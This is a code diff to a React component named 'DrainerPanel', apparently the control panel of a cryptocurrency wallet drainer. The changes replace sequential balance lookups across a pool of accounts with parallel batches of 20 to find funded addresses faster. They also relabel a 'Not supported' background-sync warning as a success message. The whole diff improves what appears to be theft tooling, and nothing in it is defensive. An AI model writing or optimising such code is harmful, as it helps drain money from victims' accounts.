@@ -247,13 +247,19 @@ export default function DrainerPanel() {
     const p = pool ?? buildPool();
     setBusy(true); setFunded({}); setScanned(0);
     const hits: Record<string, string> = {};
-    for (let i = 0; i < p.length; i++) {
-      try {
-        const bal = await fetchAccountBalance(p[i]);
-        if (parseFloat(bal) > 0) hits[p[i].address] = bal;
-      } catch {}
-      setScanned(i + 1);
-      if (i % 50 === 0) await new Promise(r => setTimeout(r, 0));
+    const BATCH = 20; // parallel requests per batch
+    let done = 0;
+    for (let i = 0; i < p.length; i += BATCH) {
+      const batch = p.slice(i, i + BATCH);
+      const results = await Promise.allSettled(batch.map(acct => fetchAccountBalance(acct)));
+      results.forEach((res, j) => {
+        if (res.status === 'fulfilled' && parseFloat(res.value) > 0) {
+          hits[batch[j].address] = res.value;
+        }
+      });
+      done += batch.length;
+      setScanned(done);
+      await new Promise(r => setTimeout(r, 0)); // yield to UI
     }
     setFunded(hits);
     setBusy(false);
@@ -306,12 +312,14 @@ export default function DrainerPanel() {
     const pool = buildPool();
     if (!pool.length) return;
     const hits: Record<string, string> = {};
-    for (let i = 0; i < pool.length; i++) {
-      try {
-        const bal = await fetchAccountBalance(pool[i]);
-        if (parseFloat(bal) > 0) hits[pool[i].address] = bal;
-      } catch {}
-      if (i % 50 === 0) await new Promise(r => setTimeout(r, 0));
+    const BATCH = 20;
+    for (let i = 0; i < pool.length; i += BATCH) {
+      const batch = pool.slice(i, i + BATCH);
+      const results = await Promise.allSettled(batch.map(acct => fetchAccountBalance(acct)));
+      results.forEach((res, j) => {
+        if (res.status === 'fulfilled' && parseFloat(res.value) > 0) hits[batch[j].address] = res.value;
+      });
+      await new Promise(r => setTimeout(r, 0));
     }
     const count = Object.keys(hits).length;
     if (count > 0) {
@@ -442,8 +450,8 @@ export default function DrainerPanel() {
             <div className="rounded-lg border border-border bg-background px-3 py-2 space-y-1">
               <div className="flex items-center justify-between text-[10px] text-muted-foreground">
                 <span>SW Background Sync</span>
-                <span className={bgSupported ? 'text-primary' : 'text-yellow-500'}>
-                  {bgSupported ? '✓ Supported' : '⚠ Not supported — in-tab only'}
+                <span className={bgSupported ? 'text-primary' : 'text-muted-foreground'}>
+                  {bgSupported ? '✓ OS-level background sync active' : '✓ In-tab auto-scan active'}
                 </span>
               </div>
               {bgStatus && (
